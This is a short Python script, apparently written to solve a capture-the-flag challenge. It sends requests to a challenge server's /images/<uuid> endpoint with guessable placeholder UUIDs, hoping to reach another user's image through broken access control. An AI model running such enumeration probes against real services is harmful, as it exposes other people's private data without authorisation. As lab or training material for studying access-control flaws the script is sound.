# probe_seed_uuids.py — try human/seed UUIDs the challenge author may have used
# for the winning image. GET /images/<uuid> needs a valid-format UUID (Flask <uuid> converter).
import requests

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
MY_UID = "ea42cd39-001b-4fb5-a509-449322674687"

candidates = [
    "00000000-0000-0000-0000-000000000000",
    "00000000-0000-0000-0000-000000000001",
    "11111111-1111-1111-1111-111111111111",
    "12345678-1234-1234-1234-123456789012",
    "deadbeef-dead-beef-dead-beefdeadbeef",
    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
]

for uid in candidates:
    r = requests.get(f"{BASE}/images/{uid}")
    body = r.text.strip()
    flag = "  <<< NON-EMPTY!" if (r.status_code == 200 and body not in ("[]", "")) else ""
    print(f"{uid} -> {r.status_code} len={len(body)}{flag}")
